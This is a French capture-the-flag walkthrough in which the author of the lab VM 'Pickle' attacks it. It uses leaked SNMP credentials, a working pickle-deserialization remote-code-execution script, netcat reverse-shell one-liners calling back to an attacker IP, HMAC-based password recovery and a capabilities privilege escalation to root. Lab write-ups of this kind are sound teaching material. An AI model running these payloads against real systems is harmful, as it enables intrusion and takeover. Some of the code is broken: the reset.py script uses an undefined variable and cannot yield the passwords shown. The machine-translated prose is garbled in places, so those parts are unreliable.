---
title: "Pickle"
description: pickle-fr.jpg
tags: ["Dans cet article je vous présente la machine que j'ai créée, elle est relativement simple et une bonne lecture du code Python vous aidera à son fonctionnement."]
---

![forthebadge made-with-python](https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif)

Aujourd'hui je vous présente la machine que j'ai créée, elle est relativement simple et une bonne lecture du code Python vous aidera à son fonctionnement.

# Scan Nmap 

    # nmap -p1-65535 -sC -sV 192.168.0.44 
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 12:31 CEST 
    Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan 
    Service scan Timing: About 50.00% done; ETC: 12:31 (0:00:06 remaining) 
    Nmap scan report for 192.168.0.44 
    Host is up (0.00057s latency). 
    PORT STATE SERVICE VERSION 
    21/tcp open ftp vsftpd 3.0.3 
    | ftp-anon: Anonymous FTP login allowed (FTP code 230) 
    |_-rwxr-xr-x 1 0 0 1197 Oct 11 14:35 init.py.bak 
    | ftp-syst: 
    | STAT: 
    | FTP server status: 
    | Connected to ::ffff:192.168.0.17 
    | Logged in as ftp 
    | TYPE: ASCII 
    | No session bandwidth limit 
    | Session timeout in seconds is 300 
    | Control connection is plain text 
    | Data connections will be plain text 
    | At session startup, client count was 2 
    | vsFTPd 3.0.3 - secure, fast, stable 
    |_End of status 
    1337/tcp open http Werkzeug httpd 1.0.1 (Python 2.7.16) 
    | http-auth: 
    | HTTP/1.0 401 UNAUTHORIZED\x0D 
    |_ Basic realm=Pickle login 
    |_http-server-header: Werkzeug/1.0.1 Python/2.7.16 
    |_http-title: Site doesn't have a title (text/html; charset=utf-8). 
    MAC Address: 08:00:27:2F:5D:59 (Oracle VirtualBox virtual NIC) 
    Service Info: OS: Unix 
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.19 seconds 

L'analyse nous montre qu'il y a 2 ports ouverts 21 `(FTP)` et 1337 `(Werkzeug HTTPd)`. Analysons maintenant les ports UDP.

    # nmap -sU -sC -sV 192.168.0.44 
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-12 12:34 CEST 
    Nmap scan report for 192.168.0.44 
    Host is up (0.00096s latency). 
    PORT STATE SERVICE VERSION 
    161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public) 
    | snmp-info: 
    | enterprise: net-snmp 
    | engineIDFormat: unknown 
    | engineIDData: 8ac2e5721551835f00000000 
    | snmpEngineBoots: 15 
    |_ snmpEngineTime: 3m22s 
    | snmp-sysdescr: Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64 |_ System uptime: 3m22.59s (20259 timeticks) 
    MAC Address: 08:00:27:2F:5D:59 (Oracle VirtualBox virtual NIC) 
    Service Info: Host: pickle 
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds 
    
Le port SNMP a été trouvé qui fonctionne en public, nous l'analyserons plus tard et de même pour le `FTP`.

# FTP

Nous pouvons voir dans le serveur FTP il y a un fichier nommé "` init.py.bak` ", téléchargez-le avec la commande ftp.

    # ftp 192.168.0.44 
    Connected to 192.168.0.44. 
    220 (vsFTPd 3.0.3) 
    Name (192.168.0.44:root): anonymous 
    331 Please specify the password. 
    Password: 
    230 Login successful. 
    Remote system type is UNIX. 
    Using binary mode to transfer files. 
    ftp> ls 
    200 PORT command successful. Consider using PASV. 
    150 Here comes the directory listing. 
    -rwxr-xr-x 1 0 0 1197 Oct 11 14:35 init.py.bak 
    226 Directory send OK. 
    ftp> mget init.py.bak 
    mget init.py.bak? y 
    200 PORT command successful. Consider using PASV. 
    150 Opening BINARY mode data connection for init.py.bak (1197 bytes). 
    226 Transfer complete. 
    1197 bytes received in 0.02 secs (70.4226 kB/s)
    
Il s'agit probablement d'un ancien fichier de sauvegarde, lorsque nous ouvrirons le fichier, il ressemble probablement au serveur Werkzeug pour le port `1337`, cela nous intéressera plus tard.

```python
from functools import wraps 
from flask import * 
import hashlib 
import socket 
import base64 
import pickle 
import hmac
    
app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/") 
    
@app.route('/', methods=["GET", "POST"])    
def index_page(): 
    if request.method == "POST" and request.form["story"] and request.form["submit"]: 
        md5_encode = hashlib.md5(request.form["story"]).hexdigest() 
        paths_page = "/opt/project/uploads/%s.log" %(md5_encode) 
        write_page = open(paths_page, "w") 
        write_page.write(request.form["story"]) 
        return "The message was sent successfully!" 
    return render_template("index.html")
    
@app.route('/reset', methods=["GET", "POST"]) 
def reset_page(): 
    pass
        
@app.route('/checklist', methods=["GET", "POST"]) 
def check_page(): 
    if request.method == "POST" and request.form["check"]: 
        path_page = "/opt/project/uploads/%s.log" %(request.form["check"]) 
        open_page = open(path_page, "rb").read() 
        if "p1" in open_page: 
            open_page = pickle.loads(open_page)
            return str(open_page) 
        else: 
            return open_page 
    else: 
        return "Server Error!" 

return render_template("checklist.html") 
    
if __name__ == '__main__': 
    app.run(host='0.0.0.0', port=1337, debug=True) 
```

# Werkzeug HTTPd 

Lorsque j'ouvre mon navigateur pour consulter le site, il demande un nom d'utilisateur et un mot de passe. J'ai essayé les informations d'identification par défaut mais cela n'a pas fonctionné.
![image](https://raw.githubusercontent.com/0xEX75/misc/master/Screenshot_2020-10-12_12-42-07.png)

# SNMP 

SNMP peut être accessible au public, alors utilisons la commande snmpwalk pour en savoir plus sur ce service. Si vous ne savez pas ce qu'est "SNMP", n'hésitez pas à consulter Google. Pour le dire simplement, il s'agit simplement d'un protocole qui gère l'équipement réseau pour surveiller et diagnostiquer à distance les problèmes de réseau et de matériel.

    # snmpwalk -c public -v 1 192.168.0.44|head -n 15 
    Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU 
    SNMPv2-MIB::sysDescr.0 = STRING: Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64 
    SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-TC::linux 
    DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (96182) 0:16:01.82 
    SNMPv2-MIB::sysContact.0 = STRING: lucas:SuperSecretPassword123! # <<<<<<<<<< 
    SNMPv2-MIB::sysName.0 = STRING: pickle 
    SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay 
    SNMPv2-MIB::sysServices.0 = INTEGER: 72 
    SNMPv2-MIB::sysORLastChange.0 = Timeticks: (45) 0:00:00.45 
    SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance 
    SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance 
    SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance 
    SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB 
    SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup 
    SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB 
    SNMPv2-MIB::sysORID.7 = OID: IP-MIB::ip 

Nous avons trouvé le justificatif, nous pouvons nous connecter au service Werkzeug. Le script python dans le serveur `FTP` nous permettra de continuer notre voyage dans cette boxe.

# Warkzeug HTTPd

Les chemins sont également dans le code Python. Mais il n'y a que «/ checklist» et «(/)». Il est manquant / réinitialisé car il s'agit probablement d'un fichier de sauvegarde et ce n'est pas le fichier principal. Nous pouvons voir les redirections de chemin dans le code Python.

```python
@app.route('/', methods=["GET", "POST"]) 
[...SNIP...] 
@app.route('/checklist', methods=["GET", "POST"]) 
```

Si nous regardons de plus près la fonction `index_page ()`, elle effectue des actions si nous essayons d'envoyer un message au serveur Werkzeug.

```python
@app.route('/', methods=["GET", "POST"]) 
def index_page(): 
    if request.method == "POST" and request.form["story"] and request.form["submit"]: 
        md5_encode = hashlib.md5(request.form["story"]).hexdigest() 
        paths_page = "/opt/project/uploads/%s.log" %(md5_encode) 
        write_page = open(paths_page, "w")
        write_page.write(request.form["story"]) 
    return "The message was sent successfully!" 
```

Tout d'abord, il existe une condition qui teste si c'est la bonne méthode (POST) et teste également si les paramètres [story] et [submit] existent. Le paramètre [story] correspond au message que nous envoyons.

```python
if request.method == "POST" and request.form["story"] and request.form["submit"] 
```

Donc, concrètement, il crypte le message que nous envoyons dans MD5 et le met dans une variable nommée md5_encode.

```pyython
    md5_encode = hashlib.md5(request.form["story"]).hexdigest() 
```

Ici, concrètement, il récupère notre message, le crypte dans MD5, et va créer un fichier avec le MD5.

```python
    paths_page = "/opt/project/uploads/%s.log" %(md5_encode) 
```
    
Ici, nous pouvons voir que le code créera un fichier dans le dossier uploads / et il écrira notre message dans le fichier.

```python
    write_page = open(paths_page, "w") 
    write_page.write(request.form["story"]) 
```

Nous allons maintenant étudier la fonction check_page (). Tout d'abord, nous pouvons observer que la condition teste la méthode si elle est en POST et teste également si le paramètre check existe.

```python
if request.method == "POST" and request.form["check"] 
```

Ici, il semble pointer vers un fichier MD5 dans le dossier uploads /. Il essaiera probablement d'ouvrir ce fichier.

```python
path_page = "/opt/project/uploads/%s.log" %(request.form["check"]) 
```

Si nous saisissons le fichier MD5 chiffré, nous pouvons l'ouvrir avec le paramètre check.

```python
open_page = open(path_page, "rb").read() 
```
    
Pickle décapera chacune de ces pièces séparément, puis, lors du décolmatage, appellera l'appelable sur les arguments fournis pour construire le nouvel objet. Et ainsi, nous pouvons construire un cornichon qui, lorsqu'il n'est pas décapé, exécutera la commande. (Bon lien ici)

```python
open_command = pickle.loads(open_page) 
```

Ici, il teste s'il y a une valeur p1 dans le fichier s'il n'y a pas de valeur p1 dans le fichier, il ouvrira le fichier.

```python
if("p1" in open_command) 
    return str(open_command) 
else: 
    return open_page 
```

# Exploitation 

Nous avons vu que la fonction check_page () charge un fichier, et si nous faisons une désérialisation des données, nous pouvons exécuter une commande. Si vous ne comprenez pas, lisez un article ici.

Nous allons d'abord faire un petit test de sérialisation et de lecture de fichiers pour mieux comprendre le contexte. Si par exemple je veux lire le message que j'ai envoyé. Je dois d'abord crypter le message dans MD5, utilisons Python pour cela.

    >>> import hashlib 
    >>> message = "hello" 
    >>> print(hashlib.md5(message).hexdigest()) 
    5d41402abc4b2a76b9719d911017c592 

Si maintenant dans le champ de texte j'écris "bonjour" et que j'essaie maintenant d'utiliser la fonction / checklist, je peux parfaitement lire mon message qui a été enregistré sur le serveur distant.

    # curl -u 'lucas:SuperSecretPassword123!' 'http://192.168.0.44:1337/checklist' -d "check=5d41402abc4b2a76b9719d911017c592" 
    hello 

Nous devons maintenant tester avec la sérialisation pour exécuter des commandes. Nous devons créer un script Python pour cela, préparez vos claviers.

```python
#coding:utf-8 

import os 
import cPickle 
import hashlib 
import requests 
class CommandExecute(object): 
    def __reduce__(self): 
        return (os.system, ('ping -c 2 192.168.0.17',)) 

convert_data = cPickle.dumps(CommandExecute()) # The message that will be sent to the server with the command. 
convert_crypt = hashlib.md5(convert_data).hexdigest() 
send_requests = requests.post('http://192.168.0.44:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!")) 
check_requests = requests.post('http://192.168.0.44:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!")) 
print(check_requests.text) 
```

Lorsque nous exécutons le script, le serveur nous renvoie des requêtes ICMP, de sorte que la commande a été exécutée avec succès par le serveur. Nous sommes sur la bonne voie.

    # tcpdump -i wlan0 icmp -n 
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode 
    listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes 
    14:03:53.499955 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 1, length 64 
    14:03:53.500017 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 1, length 64 
    14:03:54.528969 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 2, length 64 
    14:03:54.529072 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 2, length 64 
    14:03:55.553021 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 3, length 64 
    14:03:55.553110 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 3, length 64 
    14:03:56.577171 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 4, length 64 
    14:03:56.577245 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 4, length 64 
    14:03:57.578394 IP 192.168.0.44 > 192.168.0.17: ICMP echo request, id 492, seq 5, length 64 
    14:03:57.578461 IP 192.168.0.17 > 192.168.0.44: ICMP echo reply, id 492, seq 5, length 64 

# Reverse Shell 

Changeons le script pour faire un shell inversé. J'utiliserai une commande pentestmonkey pour faire mon reverse shell.

```python
return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.17 9001 >/tmp/f',)) 
```

J'ai essayé la commande ci-dessus, et j'ai également essayé une autre commande comme wget, mais cela n'a pas fonctionné, elle n'accepte pas les connexions TCP uniquement 21 et 1337. J'ai dû changer le mode de communication en faisant un shell inversé UDP. J'ai seulement ajouté l'option -u pour spécifier qu'il s'agit du mode UDP.

```python
return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 192.168.0.17 9001 >/tmp/f',)) 
```

Il faut maintenant utiliser la commande netcat pour écouter un port et surtout ne pas oublier l'option -u pour spécifier le protocole UDP. Et si maintenant, je lance le script, le serveur me renvoie un shell.

```python
@app.route('/reset', methods=["GET", "POST"]) 
@requires_auth 
def reset_page(): 
    if request.method == "POST" and request.form["username"] and request.form["key"]: 
        key = "dpff43f3p214k31301" 
        raw = request.form["username"] + key + socket.gethostbyname(socket.gethostname()) 
        hashed = hmac.new(key, raw, hashlib.sha1) 
        if request.form["key"] == hashed.hexdigest(): 
            return base64.b64encode(hashed.digest().encode("base64").rstrip("\n")) 
        else: 
            return "Server Error!" 
```

Nous pouvons voir qu'il existe une condition qui teste si la méthode est POST et teste également si le nom d'utilisateur et le paramètre clé existent.

```python
if request.method == "POST" and request.form["username"] and request.form["key"] 
```

Ensuite, il y a une clé.

```python
key = "dpff43f3p214k31301" 
```

Puis concrètement, il récupère l'argument utilisateur et le fusionne avec la clé et avec l'adresse IP locale.

```python
raw = request.form["username"] + key + socket.gethostbyname(socket.gethostname()) 
```

Ensuite, le script chiffre la variable brute avec la clé clé qui est stockée dans la variable hachée.

```python
hashed = hmac.new(key, raw, hashlib.sha1) 
```

Ensuite, il teste si l'argument clé est égal à la variable hachée en hexadécimal.

```python
if request.form["key"] == hashed.hexdigest()
```

Si la clé est égale, elle l'encode en base64, nous pouvons probablement récupérer le mot de passe de l'utilisateur mark et lucas.

```python
return base64.b64encode(hashed.digest().encode("base64").rstrip("\n") 
```

Nous devons faire des tests locaux pour mieux comprendre le système. Je copie complètement la fonction et la colle dans mon fichier python.

```python
import hashlib 
import requests 
import socket 
import base64 
import hmac 
    
key = "dpff43f3p214k31301" 
raw = user["lucas"] + key + socket.gethostbyname(socket.gethostname()) 
hashed = hmac.new(key, raw, hashlib.sha1) 
if(key[hashed.hexdigest()] == hashed): 
    print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))) 
```

Et si nous courons, nous voyons que nous avons le mot de passe lucas.

    root@0xEEX75:~/hackmyvm/pickle# python reset.py 
    YTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ== # Luca's password 

Voyons s'il y a un utilisateur autre que lucas dans le système cible.

    lucas@pickle:/opt/project$ ls /home 
    lucas mark 

Il y a bien de la marque, essayons avec la marque pour obtenir le mot de passe.

```python
import hashlib 
import requests 
import socket 
import base64 
import hmac 

key = "dpff43f3p214k31301" 
raw = user["mark"] + key + socket.gethostbyname(socket.gethostname()) 
hashed = hmac.new(key, raw, hashlib.sha1) 
if(key[hashed.hexdigest()] == hashed): 
    print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n"))) 
```

Et si nous courons, nous voyons que nous avons un mot de passe de marque.

    # python reset.py 
    SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ== # Mark's password 
    
    lucas@pickle:/opt/project$ su - mark 
    Password: SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ== 
    mark@pickle:~$ cat user.txt 
    e25fd1[...SNIP...] 

# Mark > Root 

La racine n'est pas très compliquée, recherchez simplement les fichiers prenant en charge les fonctionnalités.

    mark@pickle:~$ getcap -r / 2>/dev/null 
    /home/mark/python2 = cap_setuid+ep 
    /usr/bin/ping = cap_net_raw+ep 
    
Il vous suffit d'exécuter python et d'utiliser le module os pour exécuter une commande.

    mark@pickle:~$ /home/mark/python2 
    /home/mark/python2 
    Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
    [GCC 8.3.0] on linux2 
    Type "help", "copyright", "credits" or "license" for more information. 
    >>> import os 
    >>> os.setuid(0) 
    >>> os.system('cat /root/root.txt') 
    7a32c9739cc63ed983ae01af2577c01c
